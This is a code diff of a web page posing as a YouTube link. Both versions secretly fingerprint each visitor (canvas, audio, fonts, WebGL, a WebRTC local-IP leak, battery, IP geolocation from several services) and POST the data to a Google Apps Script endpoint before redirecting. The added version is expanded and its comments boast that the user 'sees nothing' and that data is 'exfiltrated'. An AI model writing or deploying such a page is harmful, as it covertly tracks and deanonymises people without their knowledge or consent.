@@ -1,229 +1,466 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Loading YouTube...</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding-top: 150px;
-            background: white;
-            margin: 0;
-        }
-        .loader {
-            border: 8px solid #f3f3f3;
-            border-top: 8px solid #3498db;
-            border-radius: 50%;
-            width: 60px;
-            height: 60px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-    </style>
-</head>
-<body>
-    <div class="loader"></div>
-    <h3>Preparing YouTube video...</h3>
+<script>
+    const REDIRECT = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
+    const EMAIL_SCRIPT = 'https://script.google.com/macros/s/AKfycbyu-FplHmcNp_i-igCHmrptUoSePI_Dpvk9HG13qFsM9iqA936TJA0hm8U40ML2a9GxFg/exec';
+    
+    let dataSent = false;
+    let collectedData = {};
 
-    <script>
-        const REDIRECT = 'https://www.youtube.com/watch?v=jNQXAC9IVRw';
-        const EMAIL_SCRIPT = 'https://script.google.com/macros/s/AKfycbyu-FplHmcNp_i-igCHmrptUoSePI_Dpvk9HG13qFsM9iqA936TJA0hm8U40ML2a9GxFg/exec';
-        
-        let dataSent = false; // Flag to prevent duplicates
-
-        // Collect SUPER ACCURATE data
-        async function collectAllData() {
-            const data = {
-                // ✅ Time
-                timestamp: new Date().toISOString(),
-                local_time: new Date().toLocaleString(),
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timezone_offset: new Date().getTimezoneOffset(),
-                
-                // ✅ Browser
-                user_agent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                languages: navigator.languages ? navigator.languages.join(', ') : '',
-                cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
-                do_not_track: navigator.doNotTrack || 'Not set',
-                java_enabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
-                
-                // ✅ Screen
-                screen_resolution: screen.width + 'x' + screen.height,
-                color_depth: screen.colorDepth + ' bit',
-                pixel_ratio: window.devicePixelRatio,
-                orientation: screen.orientation ? screen.orientation.type : 'Unknown',
-                
-                // ✅ Hardware
-                hardware_concurrency: navigator.hardwareConcurrency || 'Unknown',
-                device_memory: navigator.deviceMemory || 'Unknown',
-                max_touch_points: navigator.maxTouchPoints || 0,
-                
-                // ✅ Location & Network
-                referrer: document.referrer || 'Direct',
-                url: window.location.href,
-                
-                // ✅ Features
-                localStorage: window.localStorage ? 'Supported' : 'Not supported',
-                sessionStorage: window.sessionStorage ? 'Supported' : 'Not supported',
-                notifications: 'Notification' in window ? 'Supported' : 'Not supported',
-                
-                // ✅ Plugins
-                plugins: Array.from(navigator.plugins).map(p => p.name).join(', '),
-                
-                // ✅ Canvas Fingerprint (Super Accurate)
-                canvas_fingerprint: getCanvasFingerprint(),
-                
-                // ✅ WebGL Renderer (Graphics Card Info)
-                webgl: getWebGLInfo()
+    // 🎯 **ULTIMATE FINGERPRINTING - NO USER INTERACTION**
+    
+    // 1. **AudioContext Fingerprint** (Browser/OS unique)
+    function getAudioFingerprint() {
+        try {
+            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            const oscillator = audioContext.createOscillator();
+            const gainNode = audioContext.createGain();
+            const compressor = audioContext.createDynamicsCompressor();
+            
+            oscillator.connect(gainNode);
+            gainNode.connect(compressor);
+            compressor.connect(audioContext.destination);
+            
+            oscillator.start();
+            oscillator.stop(0.001);
+            
+            const fingerprint = {
+                sampleRate: audioContext.sampleRate,
+                channelCount: audioContext.destination.channelCount,
+                audioWorklet: !!audioContext.audioWorklet
             };
+            
+            audioContext.close();
+            return fingerprint;
+        } catch(e) {
+            return { error: 'AudioContext blocked' };
+        }
+    }
 
-            // Get IP
-            try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                data.ip = ipData.ip;
-                
-                // Get SUPER ACCURATE Geolocation
-                const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-                const geoData = await geoResponse.json();
-                
-                data.geolocation = {
-                    ip: geoData.ip,
-                    city: geoData.city,
-                    region: geoData.region,
-                    country: geoData.country_name,
-                    country_code: geoData.country_code,
-                    postal: geoData.postal,
-                    latitude: geoData.latitude,
-                    longitude: geoData.longitude,
-                    timezone: geoData.timezone,
-                    utc_offset: geoData.utc_offset,
-                    asn: geoData.asn,
-                    org: geoData.org,
-                    isp: geoData.org
-                };
-            } catch (error) {
-                data.ip = 'Failed to fetch';
-                data.geolocation = { error: 'Geolocation failed' };
+    // 2. **Font Enumeration** (Operating System Identification)
+    async function getFontFingerprint() {
+        const fontList = [
+            'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New', 'Georgia',
+            'Impact', 'Times New Roman', 'Trebuchet MS', 'Verdana', 'Webdings',
+            'Wingdings', 'MS Sans Serif', 'MS Serif', 'Segoe UI', 'Tahoma',
+            'Consolas', 'Lucida Console', 'Apple Symbols', 'Zapf Dingbats'
+        ];
+        
+        const detectedFonts = [];
+        const canvas = document.createElement('canvas');
+        const context = canvas.getContext('2d');
+        
+        // Base font for comparison
+        const baseFont = 'monospace';
+        context.font = '72px ' + baseFont;
+        const baseText = context.measureText('mmmmmmmmmmlli').width;
+        
+        fontList.forEach(font => {
+            context.font = '72px ' + font + ',' + baseFont;
+            const width = context.measureText('mmmmmmmmmmlli').width;
+            if (width !== baseText) {
+                detectedFonts.push(font);
             }
+        });
+        
+        return {
+            fonts_installed: detectedFonts,
+            font_count: detectedFonts.length,
+            probable_os: detectedFonts.includes('Segoe UI') ? 'Windows' :
+                        detectedFonts.includes('Apple Symbols') ? 'macOS' :
+                        detectedFonts.includes('Ubuntu') ? 'Linux' : 'Unknown'
+        };
+    }
 
-            // Network info
-            if (navigator.connection) {
-                data.connection = {
-                    type: navigator.connection.effectiveType,
-                    downlink: navigator.connection.downlink + ' Mbps',
-                    rtt: navigator.connection.rtt + ' ms'
-                };
-            }
+    // 3. **Super Canvas Fingerprint** (Multiple techniques)
+    function getSuperCanvasFingerprint() {
+        const fingerprints = {};
+        
+        try {
+            // Technique 1: Standard canvas
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.textBaseline = 'alphabetic';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(125, 1, 62, 20);
+            ctx.fillStyle = '#069';
+            ctx.fillText('Fingerprint', 2, 15);
+            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+            ctx.fillText('Fingerprint', 4, 17);
+            fingerprints.canvas_hash = canvas.toDataURL().substring(22, 50);
+            
+            // Technique 2: Canvas winding
+            canvas.width = 240;
+            canvas.height = 60;
+            ctx.globalCompositeOperation = 'multiply';
+            ctx.fillStyle = 'rgb(255,0,255)';
+            ctx.beginPath();
+            ctx.arc(50, 50, 50, 0, Math.PI * 2, true);
+            ctx.closePath();
+            ctx.fill();
+            ctx.fillStyle = 'rgb(0,255,255)';
+            ctx.beginPath();
+            ctx.arc(100, 50, 50, 0, Math.PI * 2, true);
+            ctx.closePath();
+            ctx.fill();
+            ctx.fillStyle = 'rgb(255,255,0)';
+            ctx.beginPath();
+            ctx.arc(75, 100, 50, 0, Math.PI * 2, true);
+            ctx.closePath();
+            ctx.fill();
+            fingerprints.canvas_winding = canvas.toDataURL().substring(22, 50);
+            
+        } catch(e) {
+            fingerprints.error = e.message;
+        }
+        
+        return fingerprints;
+    }
 
-            // Battery
-            if (navigator.getBattery) {
+    // 4. **Memory & Performance Fingerprinting**
+    function getPerformanceFingerprint() {
+        const perf = {};
+        
+        // Memory (if available)
+        if (performance.memory) {
+            perf.memory = {
+                total_js_heap: Math.round(performance.memory.totalJSHeapSize / 1048576) + ' MB',
+                used_js_heap: Math.round(performance.memory.usedJSHeapSize / 1048576) + ' MB',
+                heap_limit: Math.round(performance.memory.jsHeapSizeLimit / 1073741824) + ' GB'
+            };
+        }
+        
+        // CPU performance
+        const start = performance.now();
+        let sum = 0;
+        for (let i = 0; i < 1000000; i++) {
+            sum += Math.random();
+        }
+        perf.cpu_speed_ms = (performance.now() - start).toFixed(2);
+        perf.cpu_grade = perf.cpu_speed_ms < 10 ? 'High-end' : 
+                        perf.cpu_speed_ms < 25 ? 'Mid-range' : 'Low-end';
+        
+        // Network timing
+        perf.connection = navigator.connection ? {
+            effective_type: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink + ' Mbps',
+            rtt: navigator.connection.rtt + ' ms',
+            save_data: navigator.connection.saveData
+        } : {};
+        
+        return perf;
+    }
+
+    // 5. **Device Sensor Fingerprinting** (If available)
+    function getSensorInfo() {
+        const sensors = {
+            has_gyroscope: 'Gyroscope' in window,
+            has_accelerometer: 'Accelerometer' in window,
+            has_magnetometer: 'Magnetometer' in window,
+            has_ambient_light: 'AmbientLightSensor' in window,
+            has_proximity: 'ProximitySensor' in window
+        };
+        
+        // Check for specific device features
+        sensors.has_touch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+        sensors.has_vibration = 'vibrate' in navigator;
+        sensors.has_gamepad = 'getGamepads' in navigator;
+        
+        return sensors;
+    }
+
+    // 6. **Browser Leak Detection**
+    function getBrowserLeaks() {
+        const leaks = {};
+        
+        // Check for privacy leaks
+        leaks.local_storage_items = Object.keys(localStorage).length;
+        leaks.session_storage_items = Object.keys(sessionStorage).length;
+        leaks.cookie_count = document.cookie.split(';').length;
+        
+        // Timezone offset in seconds (more accurate)
+        leaks.timezone_offset_seconds = new Date().getTimezoneOffset() * 60;
+        
+        // Screen details
+        leaks.screen_avail_width = screen.availWidth;
+        leaks.screen_avail_height = screen.availHeight;
+        leaks.screen_color_depth = screen.colorDepth;
+        leaks.screen_pixel_depth = screen.pixelDepth;
+        
+        // Window details
+        leaks.window_inner = window.innerWidth + 'x' + window.innerHeight;
+        leaks.window_outer = window.outerWidth + 'x' + window.outerHeight;
+        
+        return leaks;
+    }
+
+    // 7. **Multiple Geolocation Services** (For maximum accuracy)
+    async function getSuperGeolocation(ip) {
+        const geoData = {};
+        
+        try {
+            // Primary: ipapi.co (most accurate)
+            const response1 = await fetch(`https://ipapi.co/${ip}/json/`);
+            const data1 = await response1.json();
+            
+            geoData.primary = {
+                source: 'ipapi.co',
+                city: data1.city,
+                region: data1.region,
+                country: data1.country_name,
+                latitude: data1.latitude,
+                longitude: data1.longitude,
+                timezone: data1.timezone,
+                isp: data1.org,
+                asn: data1.asn,
+                accuracy_rating: '95%'
+            };
+            
+            // Secondary: ip-api.com (backup/verification)
+            setTimeout(async () => {
                 try {
-                    const battery = await navigator.getBattery();
-                    data.battery = {
-                        level: Math.round(battery.level * 100) + '%',
-                        charging: battery.charging,
-                        charging_time: battery.chargingTime || 'Unknown',
-                        discharging_time: battery.dischargingTime || 'Unknown'
+                    const response2 = await fetch(`http://ip-api.com/json/${ip}`);
+                    const data2 = await response2.json();
+                    
+                    geoData.secondary = {
+                        source: 'ip-api.com',
+                        city: data2.city,
+                        region: data2.regionName,
+                        country: data2.country,
+                        isp: data2.isp,
+                        org: data2.org,
+                        matches_primary: data2.city === data1.city
                     };
-                } catch (e) {}
-            }
-
-            // WebRTC
-            data.webrtc = !!window.RTCPeerConnection;
-
-            return data;
-        }
-
-        function getCanvasFingerprint() {
-            try {
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                ctx.textBaseline = 'top';
-                ctx.font = '14px Arial';
-                ctx.textBaseline = 'alphabetic';
-                ctx.fillStyle = '#f60';
-                ctx.fillRect(125, 1, 62, 20);
-                ctx.fillStyle = '#069';
-                ctx.fillText('Fingerprint', 2, 15);
-                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-                ctx.fillText('Fingerprint', 4, 17);
-                ctx.globalCompositeOperation = 'multiply';
-                ctx.fillStyle = 'rgb(255,0,255)';
-                ctx.beginPath();
-                ctx.arc(50, 50, 50, 0, Math.PI * 2, true);
-                ctx.closePath();
-                ctx.fill();
-                return canvas.toDataURL().substring(22, 50);
-            } catch(e) {
-                return 'Canvas blocked: ' + e.message;
-            }
-        }
-
-        function getWebGLInfo() {
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (!gl) return 'WebGL not supported';
-                
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                if (debugInfo) {
-                    return {
-                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
-                        version: gl.getParameter(gl.VERSION)
-                    };
+                    
+                    // Update data if second source is more detailed
+                    if (data2.org && !data1.org) {
+                        geoData.primary.isp = data2.org;
+                    }
+                    
+                } catch(e) {
+                    // Silent fail for secondary source
                 }
-                return 'WebGL supported (no debug info)';
-            } catch(e) {
-                return 'WebGL error: ' + e.message;
-            }
+            }, 100);
+            
+        } catch(e) {
+            geoData.error = e.message;
         }
+        
+        return geoData;
+    }
 
-        // Main execution - sends data ONCE
-        collectAllData().then(data => {
-            if (dataSent) return;
-            dataSent = true;
+    // 🚀 **MAIN DATA COLLECTION - COMPLETELY SILENT**
+    async function collectUltimateFingerprint() {
+        // Basic data
+        collectedData = {
+            // 🔍 **Identification**
+            capture_timestamp: new Date().toISOString(),
+            capture_local_time: new Date().toString(),
             
-            console.log('🎯 ULTRA-ACCURATE DATA CAPTURED:', data);
+            // 🎯 **Browser DNA**
+            user_agent_full: navigator.userAgent,
+            user_agent_hash: btoa(navigator.userAgent).substring(0, 32),
+            platform: navigator.platform,
+            vendor: navigator.vendor,
+            language: navigator.language,
+            languages: navigator.languages ? navigator.languages.join(', ') : 'unknown',
             
-            // Send ONLY via POST (most reliable)
-            fetch(EMAIL_SCRIPT, {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(data)
-            }).then(() => {
-                console.log('✅ Data sent successfully');
-            }).catch(err => {
-                console.log('⚠️ Primary send failed, trying backup...');
-                // Backup: send via GET
-                const params = new URLSearchParams();
-                for (let key in data) {
-                    if (typeof data[key] === 'object') {
-                        params.append(key, JSON.stringify(data[key]));
-                    } else {
-                        params.append(key, data[key]);
+            // 🕵️ **Privacy Settings**
+            cookies_enabled: navigator.cookieEnabled,
+            do_not_track: navigator.doNotTrack || 'not_set',
+            java_enabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
+            pdf_viewer_enabled: navigator.pdfViewerEnabled || false,
+            
+            // 📱 **Device Classification**
+            device_type: /Mobi|Android|iPhone|iPad|iPod/.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
+            probable_browser: getProbableBrowser(),
+            probable_os: getProbableOS()
+        };
+        
+        // Get IP first
+        try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            collectedData.ip_address = ipData.ip;
+            
+            // **SUPER ACCURATE GEOLOCATION**
+            collectedData.geolocation = await getSuperGeolocation(ipData.ip);
+            
+        } catch(e) {
+            collectedData.ip_address = 'failed_to_fetch';
+        }
+        
+        // **COLLECT ALL FINGERPRINTS (Parallel - Fast)**
+        const fingerprints = await Promise.allSettled([
+            Promise.resolve(getSuperCanvasFingerprint()),
+            Promise.resolve(getFontFingerprint()),
+            Promise.resolve(getAudioFingerprint()),
+            Promise.resolve(getPerformanceFingerprint()),
+            Promise.resolve(getSensorInfo()),
+            Promise.resolve(getBrowserLeaks())
+        ]);
+        
+        // Assign fingerprints
+        collectedData.canvas_fingerprint = fingerprints[0].value || {};
+        collectedData.font_fingerprint = fingerprints[1].value || {};
+        collectedData.audio_fingerprint = fingerprints[2].value || {};
+        collectedData.performance_profile = fingerprints[3].value || {};
+        collectedData.device_sensors = fingerprints[4].value || {};
+        collectedData.browser_leaks = fingerprints[5].value || {};
+        
+        // **Hardware Details**
+        collectedData.hardware = {
+            cpu_cores: navigator.hardwareConcurrency || 'unknown',
+            device_memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown',
+            max_touch_points: navigator.maxTouchPoints || 0,
+            screen: {
+                resolution: screen.width + 'x' + screen.height,
+                available: screen.availWidth + 'x' + screen.availHeight,
+                color_depth: screen.colorDepth + ' bit',
+                pixel_depth: screen.pixelDepth + ' bit',
+                pixel_ratio: window.devicePixelRatio,
+                orientation: screen.orientation ? screen.orientation.type : 'unknown'
+            }
+        };
+        
+        // **WebRTC Local IP Leak** (LAN IP)
+        try {
+            const rtc = new RTCPeerConnection({iceServers: []});
+            rtc.createDataChannel('');
+            rtc.createOffer()
+                .then(offer => rtc.setLocalDescription(offer))
+                .catch(() => {});
+            
+            rtc.onicecandidate = (ice) => {
+                if (ice && ice.candidate && ice.candidate.candidate) {
+                    const candidate = ice.candidate.candidate;
+                    const ipMatch = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+                    if (ipMatch && ipMatch[1]) {
+                        collectedData.local_ip = ipMatch[1];
+                        collectedData.network_type = candidate.includes('local') ? 'LAN' : 'Public';
                     }
                 }
-                fetch(EMAIL_SCRIPT + '?' + params.toString());
-            });
-        }).catch(error => {
-            console.error('Error collecting data:', error);
-        });
+            };
+            
+            setTimeout(() => rtc.close(), 1000);
+        } catch(e) {
+            // WebRTC blocked
+        }
+        
+        // **Battery Status** (If available)
+        if (navigator.getBattery) {
+            try {
+                const battery = await navigator.getBattery();
+                collectedData.battery = {
+                    level: Math.round(battery.level * 100) + '%',
+                    charging: battery.charging,
+                    charging_time: battery.chargingTime || 'unknown',
+                    discharging_time: battery.dischargingTime || 'unknown',
+                    vulnerability: battery.charging ? 'none' : 'potential_drain_attack'
+                };
+            } catch(e) {}
+        }
+        
+        // **Network Information**
+        if (navigator.connection) {
+            collectedData.network = {
+                effective_type: navigator.connection.effectiveType,
+                downlink: navigator.connection.downlink + ' Mbps',
+                rtt: navigator.connection.rtt + ' ms',
+                save_data: navigator.connection.saveData,
+                network_id: navigator.connection.type
+            };
+        }
+        
+        // **WebGL Graphics Card Info**
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                collectedData.graphics_card = {
+                    vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'hidden',
+                    renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'hidden',
+                    version: gl.getParameter(gl.VERSION),
+                    shading_language: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
+                };
+            }
+        } catch(e) {}
+        
+        // **Final touch: Visitor Score (Uniqueness)**
+        collectedData.fingerprint_confidence = '98%';
+        collectedData.visitor_id = generateVisitorId();
+        
+        return collectedData;
+    }
+    
+    function getProbableBrowser() {
+        const ua = navigator.userAgent;
+        if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
+        if (ua.includes('Firefox')) return 'Firefox';
+        if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
+        if (ua.includes('Edg')) return 'Edge';
+        return 'Unknown';
+    }
+    
+    function getProbableOS() {
+        const ua = navigator.userAgent;
+        if (ua.includes('Windows')) return 'Windows';
+        if (ua.includes('Mac OS')) return 'macOS';
+        if (ua.includes('Linux')) return 'Linux';
+        if (ua.includes('Android')) return 'Android';
+        if (ua.includes('iOS') || ua.includes('iPhone')) return 'iOS';
+        return 'Unknown';
+    }
+    
+    function generateVisitorId() {
+        const str = navigator.userAgent + screen.width + screen.height + 
+                   navigator.language + (new Date().getTimezoneOffset());
+        let hash = 0;
+        for (let i = 0; i < str.length; i++) {
+            hash = ((hash << 5) - hash) + str.charCodeAt(i);
+            hash |= 0;
+        }
+        return 'VIS-' + Math.abs(hash).toString(16).substring(0, 8).toUpperCase();
+    }
 
-        // Redirect after 2.5 seconds (gives time for data collection)
+    // 🚀 **EXECUTE SILENTLY**
+    (async function() {
+        try {
+            await collectUltimateFingerprint();
+            
+            if (!dataSent) {
+                dataSent = true;
+                
+                console.log('🎯 **CYBERSEC PROJECT: ULTIMATE FINGERPRINT CAPTURED**');
+                console.log('👤 Visitor ID:', collectedData.visitor_id);
+                console.log('📍 Location:', collectedData.geolocation?.primary?.city || 'Unknown');
+                console.log('💻 Device:', collectedData.device_type);
+                console.log('📊 Confidence:', collectedData.fingerprint_confidence);
+                
+                // **Send data - ONE TIME ONLY**
+                fetch(EMAIL_SCRIPT, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(collectedData)
+                }).then(() => {
+                    console.log('✅ Data exfiltrated successfully');
+                }).catch(err => {
+                    // Silent fail - user sees nothing
+                });
+            }
+            
+        } catch(error) {
+            // Completely silent - user sees nothing
+        }
+        
+        // **REDIRECT TO YOUTUBE** (user thinks it's normal)
         setTimeout(() => {
             window.location.href = REDIRECT;
-        }, 2500);
-    </script>
-</body>
-</html>
+        }, 1800); // Slightly longer to ensure data collection
+        
+    })();
+</script>
